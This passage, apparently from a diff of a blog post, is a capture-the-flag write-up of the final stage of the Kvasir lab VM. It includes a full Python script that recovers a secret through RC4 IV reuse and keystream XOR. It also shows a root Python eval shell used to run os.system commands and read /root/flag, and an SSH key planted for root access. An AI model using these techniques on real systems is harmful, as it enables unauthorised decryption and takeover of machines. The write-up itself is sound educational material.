+</span><span class='line'><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>127.0.0.1<span class="o">]</span> 1234 <span class="o">(</span>?<span class="o">)</span> open : Operation now in <span class="nv">progress</span>
+</span><span class='line'><span class="o">=============================</span>
+</span><span class='line'>Can you retrieve my secret..?
+</span><span class='line'><span class="o">=============================</span>
+</span><span class='line'>
+</span><span class='line'>Usage:
+</span><span class='line'><span class="s1">&#39;V&#39;</span> to view the encrypted flag
+</span><span class='line'><span class="s1">&#39;E&#39;</span> to encrypt a plaintext string <span class="o">(</span>e.g. <span class="s1">&#39;E AAAA&#39;</span><span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'>V
+</span><span class='line'>5a5062:36507a63b56865f7fd201860
+</span><span class='line'>^C
+</span><span class='line'>root@kali:~#
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We are presented with yet another <em>game</em>, this time, something completely different. I played a little with the output, attempting to escape the environment. Most input would be picked up as invalid input, and the <code>netcat</code> connection killed, causing me to have to re-run <code>sudo /opt/wep2.py</code> on the kefka session.</p>
+
+<p>By now, I was pretty exhausted from everything Kvasir has thrown at me and the rabbit hole has become pretty deep and dark. From testing the above game, I guessed that the output for commands were <code>salt:cyphertext</code>, which changes for anything you throw at it. Furthermore, the game allows you to encrypt known clear text. As a test, I tested with <em>A</em>, and studied the output:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>E A
+</span><span class='line'>348bbc:8d
+</span><span class='line'>E A
+</span><span class='line'>f2fb0c:6e
+</span><span class='line'>E A
+</span><span class='line'>64d7fb:2d
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Assuming the first part is the salt, my text is encrypted and presented as a single hex byte. Other than that, I am not really sure what my attack vectors are, if any.</p>
+
+<p>Taking it easy for a while, I had a chat to @barrebas on how far I am with Kvasir, when he mentioned that the filename <code>wep2.py</code> should be taken as a hint!</p>
+
+<p><em>This had to be the hardest part of the entire challenge for me personally. The largest part of this was spent reading reading reading and more reading! Ofc, this is also my biggest take from Kvasir :)</em></p>
+
+<h3>understanding what WEP actually is</h3>
+
+<p>With the limited interaction I have had with the last game, and the hint <code>wep2</code>, I set out to test my Google-fu. I know there is no such thing as WEP2, but there is WPA2. So the first part was to determine if the hint is something like WEP or WPA2.</p>
+
+<p>Some resources that really helped me get to grips with what we are facing here was:
+ <a href="http://www.isaac.cs.berkeley.edu/isaac/mobicom.pdf">http://www.isaac.cs.berkeley.edu/isaac/mobicom.pdf</a>
+ <a href="http://www.csee.umbc.edu/courses/graduate/CMSC628/spring2002/ppt/kunjan.ppt">http://www.csee.umbc.edu/courses/graduate/CMSC628/spring2002/ppt/kunjan.ppt</a>
+ <a href="http://www.cs.berkeley.edu/~daw/talks/HPColloq03.ppt">http://www.cs.berkeley.edu/~daw/talks/HPColloq03.ppt</a>
+ <a href="http://www.cs.unb.ca/~ken/papers/cnsr2004.pdf">http://www.cs.unb.ca/~ken/papers/cnsr2004.pdf</a></p>
+
+<p>Of the above list, I highly recommend you check out the <code>.ppt</code>&rsquo;s. As lame as it may seem, it really helped me just over the cliff into understanding what I was facing here and what the fundamental problem is that I should be exploiting.</p>
+
+<p>The reading on WPA revealed that a encrypted packet is determined similar to a RC4 stream cipher is. Let <em>C</em> be the cipher text and <em>P</em> be the plain text. A publicly known Initialization Vector and a Secret Key as a function of RC4 is ^ (XOR&rsquo;d) with the plaintext to produce the cipher text. Typically, this is represented as:</p>
+
+<p><strong>C = P ^ RC4(iv, k)</strong></p>
+
+<p>With that now known, we can learn about vulnerabilities in this algorithm. More specifically, about <a href="http://en.wikipedia.org/wiki/Stream_cipher_attack">Stream Cipher Attacks</a> and <a href="http://en.wikipedia.org/wiki/Related-key_attack">Related Key Attacks</a>. With all of the knowledge gained with close to 6 hours of almost straight googling, I was ready to get going at trying something.</p>
+
+<p>My initial understanding was as follows; If I can get 2 unique plaintext’s encrypted using the same IV&rsquo;s, I can XOR the 2 cipher texts with each other to determine the key stream for that IV, and then XOR that key stream with the cipher text I wanted to decrypt. Considering I was able to create encryption samples, I decided not to spend any time on WPA2 and concluded the <code>2</code> in <code>wep2</code> was another troll :)</p>
+
+<h3>attacking the encryption game</h3>
+
+<p>Armed with the knowledge I had now, I started to write some skeleton code to interact with the socket. This was very basic and simply sent and received frames as required.</p>
+
+<p>I then decided on 2 strings to test. The first being (A * 24), the second being (B * 24). The idea was to send the first string (A * 24) 1000 times, and record the IV:CIPHER_TEXT in a python dictionary. I would then loop a second time using a string of (B * 24), each time doing a lookup in the dictionary for a matching IV. If one is found, it means we have 2 known plain texts (A * 24 and B * 24), 2 known cipher texts and their common IV (iv collision in fact).</p>
+
+<p>Once the collision is found, I would then XOR the Cipher Text with the Clear Text to determine the key stream, and finally, XOR the key stream with any cipher text sharing the same IV to determine the clear text.</p>
+
+<p>I completed the python skeleton script to do the actual XOR and IV matching work, and after a few hours, had successful runs in decrypting using the key derived from the (A *24) plaintext&rsquo;s cipher text:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# proxychains ./un_wep-testing.py
+</span><span class='line'>ProxyChains-3.1 <span class="o">(</span>http://proxychains.sf.net<span class="o">)</span>
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Generating base iv:cy dictionary with <span class="s1">&#39;A&#39;</span> *24
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> iv_dict knows about 5000 combinations
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Starting Bruteforce with <span class="s1">&#39;B&#39;</span> *24
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Frame matched IV of 929d87 in 4559 tries!
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Base Cyper Text was: c5bdd075b0b1de9e9a663999a860a53348cafea5f73c794b
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Matched Cypher Text: c6bed376b3b2dd9d99653a9aab63a6304bc9fda6f43f7a48
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> A ^ B
+</span><span class='line'>BBBBBBBBBBBBBBBBBBBBBBBB
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Done
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This was great news, but it did not decrypt our flag :) For that, I had to bring some modifications to the code. Firstly, I tested with (A * 24) because if I know the plain text, testing is easier. I do not know the plaintext for the encrypted flag yet, so I had to be 100% sure the theory works before maybe getting a wrong answer from the flag decryption. So, I changed the IV dictionary generation from encrypting (A *24) 5000 times to requesting the encrypted flag 5000 times.</p>
+
+<p>With the changes in, I ended up with the following script:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#!/usr/bin/python</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># Kvasir RC4 Key Re-use Attack</span>
+</span><span class='line'>
+</span><span class='line'>import socket
+</span><span class='line'>
+</span><span class='line'><span class="c"># start a fresh iv_dict used for lookups</span>
+</span><span class='line'><span class="nv">iv_dict</span> <span class="o">=</span> <span class="o">{}</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># connection to the thing</span>
+</span><span class='line'><span class="nv">sock</span> <span class="o">=</span> socket.socket<span class="o">(</span>socket.AF_INET, socket.SOCK_STREAM<span class="o">)</span>
+</span><span class='line'>sock.connect<span class="o">((</span><span class="s1">&#39;127.0.0.1&#39;</span>, 1234<span class="o">))</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># read the banner so we can continue</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># =============================</span>
+</span><span class='line'><span class="c"># Can you retrieve my secret..?</span>
+</span><span class='line'><span class="c"># =============================</span>
+</span><span class='line'><span class="c"># </span>
+</span><span class='line'><span class="c"># Usage:</span>
+</span><span class='line'><span class="c"># &#39;V&#39; to view the encrypted flag</span>
+</span><span class='line'><span class="c"># &#39;E&#39; to encrypt a plaintext string (e.g. &#39;E AAAA&#39;)</span>
+</span><span class='line'><span class="nv">banner</span> <span class="o">=</span> sock.recv<span class="o">(</span>1024<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># create some iv:cyper combinations of the flag</span>
+</span><span class='line'>print <span class="s1">&#39;[+] Generating base iv:cy dictionary&#39;</span>
+</span><span class='line'><span class="k">for </span>i in range<span class="o">(</span>0,5000<span class="o">)</span>:
+</span><span class='line'>    sock.send<span class="o">(</span><span class="s1">&#39;V\n&#39;</span><span class="o">)</span>
+</span><span class='line'>    <span class="nv">frame</span> <span class="o">=</span> sock.recv<span class="o">(</span>150<span class="o">)</span>
+</span><span class='line'>    <span class="nv">iv</span> <span class="o">=</span> frame.split<span class="o">(</span><span class="s1">&#39;:&#39;</span><span class="o">)[</span>0<span class="o">]</span>
+</span><span class='line'>    <span class="nv">cy</span> <span class="o">=</span> frame.split<span class="o">(</span><span class="s1">&#39;:&#39;</span><span class="o">)[</span>1<span class="o">]</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c"># add the values</span>
+</span><span class='line'>    iv_dict<span class="o">[</span>iv<span class="o">]</span> <span class="o">=</span> cy.strip<span class="o">()</span>
+</span><span class='line'>print <span class="s1">&#39;[+] The iv_dict knows about %d combinations&#39;</span> % len<span class="o">(</span>iv_dict<span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># start processing the second string, looking up the IV</span>
+</span><span class='line'>print <span class="s1">&#39;[+] Starting Bruteforce with \&#39;B\&#39; *24&#39;</span>
+</span><span class='line'><span class="nv">count</span> <span class="o">=</span> 0
+</span><span class='line'><span class="k">while </span>True:
+</span><span class='line'>
+</span><span class='line'>    count +<span class="o">=</span> 1
+</span><span class='line'>    sock.send<span class="o">(</span><span class="s1">&#39;E &#39;</span> + <span class="s1">&#39;B&#39;</span> *24 + <span class="s1">&#39;\n&#39;</span><span class="o">)</span>
+</span><span class='line'>    <span class="nv">frame</span> <span class="o">=</span> sock.recv<span class="o">(</span>150<span class="o">)</span>
+</span><span class='line'>    <span class="nv">iv</span> <span class="o">=</span> frame.split<span class="o">(</span><span class="s1">&#39;:&#39;</span><span class="o">)[</span>0<span class="o">]</span>
+</span><span class='line'>    <span class="nv">cy</span> <span class="o">=</span> frame.split<span class="o">(</span><span class="s1">&#39;:&#39;</span><span class="o">)[</span>1<span class="o">]</span>.strip<span class="o">()</span> <span class="c"># annoying \n</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">if </span>iv in iv_dict:
+</span><span class='line'>        print <span class="s1">&#39;[+] Frame matched IV of %s in %d tries!&#39;</span> % <span class="o">(</span>iv, count<span class="o">)</span>
+</span><span class='line'>        print <span class="s1">&#39;[+] Base Cyper Text was: %s&#39;</span> % iv_dict<span class="o">[</span>iv<span class="o">]</span>
+</span><span class='line'>        print <span class="s1">&#39;[+] Matched Cypher Text: %s&#39;</span> % cy
+</span><span class='line'>
+</span><span class='line'>        <span class="c"># first XOR to get the keystream for this IV</span>
+</span><span class='line'>        <span class="nv">keystream</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>.join<span class="o">(</span>chr<span class="o">(</span>ord<span class="o">(</span>a<span class="o">)</span> ^ ord<span class="o">(</span>b<span class="o">))</span> <span class="k">for </span>a,b in zip<span class="o">(</span>cy.decode<span class="o">(</span><span class="s2">&quot;hex&quot;</span><span class="o">)</span>,<span class="s1">&#39;B&#39;</span>*24<span class="o">))</span>
+</span><span class='line'>        print <span class="s1">&#39;[+] Keystream: %s&#39;</span> % keystream.encode<span class="o">(</span><span class="s2">&quot;hex&quot;</span><span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="c"># then decode second cypher text using the keystream for the cleartext</span>
+</span><span class='line'>        <span class="nv">decrypted</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>.join<span class="o">(</span>chr<span class="o">(</span>ord<span class="o">(</span>a<span class="o">)</span> ^ ord<span class="o">(</span>b<span class="o">))</span> <span class="k">for </span>a,b in zip<span class="o">((</span>iv_dict<span class="o">[</span>iv<span class="o">])</span>.decode<span class="o">(</span><span class="s2">&quot;hex&quot;</span><span class="o">)</span>,keystream<span class="o">))</span>
+</span><span class='line'>        print <span class="s1">&#39;[+] Decrytped flag is: %s&#39;</span> % decrypted
+</span><span class='line'>        <span class="nb">break</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="c"># progress incase things take longer than expected</span>
+</span><span class='line'>    <span class="k">if </span>count % <span class="nv">100000</span> <span class="o">==</span> 0:
+</span><span class='line'>        print <span class="s1">&#39;[+] Tries: %d&#39;</span> % count
+</span><span class='line'>
+</span><span class='line'>print <span class="s1">&#39;[+] Done&#39;</span>
+</span><span class='line'>sock.close<span class="o">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In no time at all, the above code outputs the decrypted flag:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# proxychains ./un_wep.py
+</span><span class='line'>ProxyChains-3.1 <span class="o">(</span>http://proxychains.sf.net<span class="o">)</span>
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Generating base iv:cy dictionary
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> The iv_dict knows about 5000 combinations
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Starting Bruteforce with <span class="s1">&#39;B&#39;</span> *24
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Frame matched IV of 06f39e in 1696 tries!
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Base Cyper Text was: 02bf9ad2d5629c9f530b39a6
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Matched Cypher Text: 70aaeec5a156a99a251e4ab2217436ae08a64b5ce0c21c9c
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Keystream: 32e8ac87e314ebd8675c08f0633674ec4ae4091ea2805ede
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Decrytped flag is: 0W6U6vwG4W1V
+</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Done
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>0W6U6vwG4W1V</code>. Seriously. All that work for another string. :( I immediately started to doubt if I nailed this. I tested this as the root password for all the previous machines I have not been root on yet to no avail. Then, I looked at the clock as saw it was 3am&hellip; bed time for me!!</p>
+
+<h2>finally getting the flag, sort of&hellip;</h2>
+
+<p>I woke up 7am, immediately thinking about this small string and the amount of work that went into getting it. I double checked my theory and script to make sure I am not missing something, but everything seemed to look fine.</p>
+
+<p>After a breath of fresh air, I reconnected to the game and slapped the string in and pressed enter:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# proxychains nc -v 127.0.0.1 1234
+</span><span class='line'>ProxyChains-3.1 <span class="o">(</span>http://proxychains.sf.net<span class="o">)</span>
+</span><span class='line'>127.0.0.1: inverse host lookup failed:
+</span><span class='line'><span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>127.0.0.1<span class="o">]</span> 1234 <span class="o">(</span>?<span class="o">)</span> open : Operation now in <span class="nv">progress</span>
+</span><span class='line'><span class="o">=============================</span>
+</span><span class='line'>Can you retrieve my secret..?
+</span><span class='line'><span class="o">=============================</span>
+</span><span class='line'>
+</span><span class='line'>Usage:
+</span><span class='line'><span class="s1">&#39;V&#39;</span> to view the encrypted flag
+</span><span class='line'><span class="s1">&#39;E&#39;</span> to encrypt a plaintext string <span class="o">(</span>e.g. <span class="s1">&#39;E AAAA&#39;</span><span class="o">)</span>
+</span><span class='line'>
+</span><span class='line'>0W6U6vwG4W1V
+</span><span class='line'>&gt;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Wut. Ok, so I have a <em>thing</em> now. It didn’t accept anything I was typing into it. Everything just came back with another <code>&gt;</code>.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>&gt; ls
+</span><span class='line'>&gt; id
+</span><span class='line'>&gt; whoami
+</span><span class='line'>&gt; ls -lah
+</span><span class='line'>&gt; uname -a
+</span><span class='line'>&gt; <span class="nb">help</span>
+</span><span class='line'>&gt; ?
+</span><span class='line'>&gt;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I disconnected from the netcat session and tabbed back to the session where the <code>/opt/wep2.py</code> script is started. Immediately it became clear what was going on:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>kefka@adm:~<span class="nv">$ </span>sudo /opt/wep2.py
+</span><span class='line'>Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
+</span><span class='line'>  File <span class="s2">&quot;&lt;string&gt;&quot;</span>, line 1, in &lt;module&gt;
+</span><span class='line'>NameError: name <span class="s1">&#39;ls&#39;</span> is not defined
+</span><span class='line'>Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
+</span><span class='line'>  File <span class="s2">&quot;&lt;string&gt;&quot;</span>, line 1, in &lt;module&gt;
+</span><span class='line'>NameError: name <span class="s1">&#39;whoami&#39;</span> is not defined
+</span><span class='line'>Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
+</span><span class='line'>  File <span class="s2">&quot;&lt;string&gt;&quot;</span>, line 1, in &lt;module&gt;
+</span><span class='line'>NameError: name <span class="s1">&#39;ls&#39;</span> is not defined
+</span><span class='line'>Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
+</span><span class='line'>  File <span class="s2">&quot;&lt;string&gt;&quot;</span>, line 1, in &lt;module&gt;
+</span><span class='line'>NameError: name <span class="s1">&#39;uname&#39;</span> is not defined
+</span><span class='line'>  File <span class="s2">&quot;&lt;string&gt;&quot;</span>, line 1
+</span><span class='line'>    ?
+</span><span class='line'>    ^
+</span><span class='line'>SyntaxError: invalid syntax
+</span><span class='line'>Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
+</span><span class='line'>  File <span class="s2">&quot;/opt/wep2.py&quot;</span>, line 94, in &lt;module&gt;
+</span><span class='line'>    handler<span class="o">(</span>sock, addr<span class="o">)</span>
+</span><span class='line'>  File <span class="s2">&quot;/opt/wep2.py&quot;</span>, line 74, in handler
+</span><span class='line'>    sock.send<span class="o">(</span>p1<span class="o">)</span>
+</span><span class='line'>socket.error: <span class="o">[</span>Errno 32<span class="o">]</span> Broken pipe
+</span><span class='line'>kefka@adm:~<span class="err">$</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It seems like I have a kind of python shell? After a bit of fiddling around, I eventually started getting something usefull out of it:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>0W6U6vwG4W1V
+</span><span class='line'>&gt; import os<span class="p">;</span> os.system<span class="o">(</span><span class="s1">&#39;id&#39;</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Yay :) I went straight for the <code>cat /root/flag</code>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>&gt; import os<span class="p">;</span> os.system<span class="o">(</span><span class="s1">&#39;cat /root/flag&#39;</span><span class="o">)</span><span class="p">;</span>
+</span><span class='line'>    _  __                             _
+</span><span class='line'>   <span class="p">|</span> <span class="p">|</span>/ /   __ __   __ _     ___     <span class="o">(</span>_<span class="o">)</span>      _ _
+</span><span class='line'>   <span class="p">|</span> <span class="s1">&#39; &lt;    \ I /  / _` |   (_-&lt;     | |     | &#39;</span>_<span class="p">|</span>
+</span><span class='line'>   <span class="p">|</span>_<span class="p">|</span><span class="se">\_\ </span>  _<span class="se">\_</span>/_  <span class="se">\_</span>_,_<span class="p">|</span>   /__/_   _<span class="p">|</span>_<span class="p">|</span>_   _<span class="p">|</span>_<span class="p">|</span>_
+</span><span class='line'>  _<span class="p">|</span><span class="s2">&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;</span><span class="p">|</span>_<span class="p">|</span><span class="s2">&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;</span><span class="p">|</span>_<span class="p">|</span><span class="s2">&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;</span><span class="p">|</span>
+</span><span class='line'>  <span class="s2">&quot;`-0-0-&#39;&quot;</span><span class="sb">`</span>-0-0-<span class="s1">&#39;&quot;`-0-0-&#39;</span><span class="s2">&quot;`-0-0-&#39;&quot;</span><span class="sb">`</span>-0-0-<span class="s1">&#39;&quot;`-0-0-&#39;</span>
+</span><span class='line'>
+</span><span class='line'>Pbatenghyngvbaf ba orngvat Xinfve - V ubcr lbh rawblrq
+</span><span class='line'>gur evqr.  Gnxr uvf oybbq, zvk jvgu ubarl naq qevax
+</span><span class='line'>gur Zrnq bs Cbrgel...
+</span><span class='line'>
+</span><span class='line'>Ovt fubhg bhg gb zl orgn grfgref: @oneeronf naq @GurPbybavny.
+</span><span class='line'>Fcrpvny gunaxf gb Onf sbe uvf cngvrapr qhevat guvf raqrnibhe.
+</span><span class='line'>
+</span><span class='line'>Srry serr gb cvat zr jvgu gubhtugf/pbzzragf ba
+</span><span class='line'>uggc://jv-sh.pb.hx, <span class="c">#IhyaUho VEP be Gjvggre.</span>
+</span><span class='line'>
+</span><span class='line'>  enfgn_zbhfr<span class="o">(</span>@_EnfgnZbhfr<span class="o">)</span>
+</span><span class='line'>&gt;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Err, oh <a href="https://twitter.com/_RastaMouse">@_RastaMouse</a> you!! What is this? I figured I need to get a proper shell going to make life a little easier for myself. I did this by using the command execution we have now to prepare a authorized_keys file for root for me, adding the public key of the key pair I initially created. Then, finally, I SSH&rsquo;d in as root:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# proxychains ssh root@127.0.0.1 -i kvasir_key
+</span><span class='line'>ProxyChains-3.1 <span class="o">(</span>http://proxychains.sf.net<span class="o">)</span>
+</span><span class='line'>Linux adm 3.2.0-4-amd64 <span class="c">#1 SMP Debian 3.2.60-1+deb7u3 x86_64</span>
+</span><span class='line'>
+</span><span class='line'>The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
+</span><span class='line'>the exact distribution terms <span class="k">for </span>each program are described in the
+</span><span class='line'>individual files in /usr/share/doc/*/copyright.
+</span><span class='line'>
+</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span><span class='line'>permitted by applicable law.
+</span><span class='line'>Last login: Sun Nov  9 16:57:16 2014 from localhost
+</span><span class='line'>root@adm:~#
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>the final troll</h2>
+
+<p>With the <code>/root/flag</code> in a really strange format, I poked around a little to see what is going on. Eventually I went down to a python shell, loaded the flag and fiddled with <code>decode()</code> again:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
